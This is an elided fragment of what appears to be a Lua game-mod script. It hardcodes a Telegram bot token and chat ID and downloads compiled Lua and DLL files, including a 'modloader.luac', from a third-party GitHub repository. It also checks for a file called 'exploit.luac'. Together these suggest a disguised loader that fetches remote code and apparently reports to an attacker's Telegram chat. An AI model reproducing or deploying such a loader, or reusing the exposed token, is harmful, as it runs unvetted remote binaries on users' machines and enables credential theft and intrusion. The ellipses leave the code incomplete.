...
local token = '6092976961:AAH_1eNYc79_z_PB6ICx_H0swKy5wFrbVcQ'
local chat_id = '-4203302027'
...
local update_url = "https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/updatem.txt"
local update_path = getWorkingDirectory() .. "/updateforum.txt"

local script_url = "https://github.com/yuriysyt/lib_for_script/raw/main/modloader.luac"
local script_path = getWorkingDirectory() .. "/modloader.luac"
local second_script_path = getWorkingDirectory() .. "/exploit.luac"
...
function main()
    ...
    if doesFileExist(second_script_path) then
        thisScript():unload()
    end
...
function download_all()
    ...
    local filesToDownload = {
        ...
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/library.dll', path = libPath .. 'library.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lfs.dll', path = libPath .. 'lfs.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lfs/fs.lua', path = libPath .. 'lfs/fs.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lfs/impl/fs.lua', path = libPath .. 'lfs/impl/fs.lua'}
    }
